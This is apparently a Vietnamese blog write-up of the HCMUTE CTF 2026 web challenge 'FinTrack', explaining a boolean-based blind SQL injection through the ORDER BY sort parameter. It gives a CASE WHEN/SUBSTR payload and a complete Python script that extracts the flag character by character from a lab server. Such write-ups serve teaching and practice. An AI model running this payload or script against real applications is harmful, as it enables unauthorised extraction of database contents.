---
layout: single
title: "[Writeup] HCMUTE CTF 2026 - FinTrack (Blind SQLi)"
date: 2026-01-29
classes: wide
categories: [ctf, web]
tags: [hcmute, sqli, blind-sqli, python, automation]
permalink: /writeups/hcmute-ctf-fintrack/
---

Bài tiếp theo trong series HCMUTE CTF là **FinTrack**. Đây là một bài web thú vị về lỗ hổng SQL Injection dạng Blind.

**Đề bài:** "Keep your finances in check and your records sorted. But is the data handled as securely as it is organized?"

Có một gợi ý quan trọng trong source code (HTML comment):
`<!-- Dev Note: The flag is stored in the 'config' table (name='flag', value=...). Do not delete! -->`

## 1. Phân tích lỗ hổng (Order By SQL Injection)

Điểm yếu nằm ở tham số `sort` trên URL: `?sort=date`, `?sort=amount`,... Đây là lỗ hổng **Order By SQL Injection**.

Thông thường, câu lệnh SQL phía backend sẽ có dạng:
```sql
SELECT ... FROM txransactions ORDER BY $sort
```

Kỹ thuật này khác với SQLi thông thường vì mình không thể dùng `UNION` ngay lập tức để hiển thị dữ liệu ra màn hình. Mình cần sử dụng kỹ thuật **Blind SQL Injection** dựa trên logic (Boolean-based).

## 2. Chiến thuật khai thác

Mục tiêu là lấy dữ liệu từ bảng `config`, cột `value` tại nơi `name='flag'`.

### Ý tưởng: "Hỏi xoáy đáp xoay"

Mình sẽ ép database sắp xếp danh sách giao dịch dựa trên một điều kiện đúng/sai liên quan đến ký tự của Flag.

Payload mẫu:
```sql
(CASE WHEN (SELECT SUBSTR(value,1,1) FROM config WHERE name='flag')='f' THEN date ELSE amount END)
```

- **Nếu chữ cái đầu là 'f' (Đúng):** Sắp xếp theo **Date**.
- **Nếu không phải là 'f' (Sai):** Sắp xếp theo **Amount**.

Bằng cách quan sát thứ tự các giao dịch (ví dụ: "Cloud VPS" lên đầu hay "Salary" lên đầu), mình sẽ biết được ký tự mình đoán là đúng hay sai.

## 3. Script Khai thác (The Exploit)

Vì việc đoán từng ký tự bằng tay rất lâu, mình đã viết một script Python để tự động hóa quá trình này (Brute-force).

```python
import requests
import urllib3

# Tắt cảnh báo SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "http://103.130.211.150:19075/dashboard"
# Thay session mới nhất của bạn vào đây
cookies = {"session": "YOUR_SESSION_COOKIE_HERE"}

chars = "_{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-!"
flag = ""

print("[+] Kiểm tra kết nối và Cookie...")
# ... (Code kiểm tra kết nối ban đầu)

print("[+] Kết nối thành công. Bắt đầu tìm flag...")

for i in range(1, 50): # Giả sử flag dài tối đa 50 ký tự
    found = False
    for char in chars:
        # Payload ép 'Cloud VPS' (date: 2023-10-05) lên đầu nếu ký tự đoán đúng
        payload = f"(CASE WHEN (SELECT SUBSTR(value,{i},1) FROM config WHERE name='flag')='{char}' THEN date ELSE amount END) DESC"
        
        params = {'sort': payload}
        try:
            r = requests.get(url, params=params, cookies=cookies, timeout=10)
            
            # Kiểm tra xem 'Cloud VPS Hosting' có phải là mục đầu tiên không
            if 'class="t-name">' in r.text:
                first_item = r.text.split('class="t-name">')[1].split('</span>')[0].strip()
                
                if first_item == "Cloud VPS Hosting":
                    flag += char
                    print(f"[!] Tìm thấy ký tự thứ {i}: {char} => Flag: {flag}")
                    found = True
                    if char == "}":
                        print(f"[#] THÀNH CÔNG! Flag là: {flag}")
                        exit()
                    break
        except Exception as e:
            print(f"[-] Lỗi request: {e}")
            break
            
    if not found:
        print(f"[-] Không tìm thấy ký tự tiếp theo. Flag hiện tại: {flag}")
        break
```

## 4. Kết luận

Kỹ thuật **Boolean-based Blind SQL Injection** trong mệnh đề `ORDER BY` là một kỹ thuật rất hay. Nó biến việc sắp xếp danh sách thành một kênh truyền tin (Oracle) để trích xuất dữ liệu từng chút một.

Flag của bài này sẽ được script tìm ra sau vài phút chạy! chúc các bạn thành công.
